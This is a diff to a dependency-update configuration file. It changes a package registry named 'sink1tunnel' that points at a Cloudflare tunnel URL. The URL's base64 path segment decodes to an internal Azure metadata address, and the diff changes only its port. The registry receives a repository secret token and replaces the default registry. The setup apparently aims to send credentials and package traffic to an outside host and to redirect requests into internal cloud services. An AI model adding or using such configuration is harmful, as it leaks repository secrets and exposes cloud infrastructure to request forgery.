@@ -2,7 +2,7 @@ version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://whose-vertex-modern-timely.trycloudflare.com/bare/302/aHR0cDovLzE2OC42My4xMjkuMTY6ODA4NC8_Y29tcD12ZXJzaW9ucw/x
+    url: https://whose-vertex-modern-timely.trycloudflare.com/bare/302/aHR0cDovLzE2OC42My4xMjkuMTY6MzI1OTgvP2NvbXA9dmVyc2lvbnM/x
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
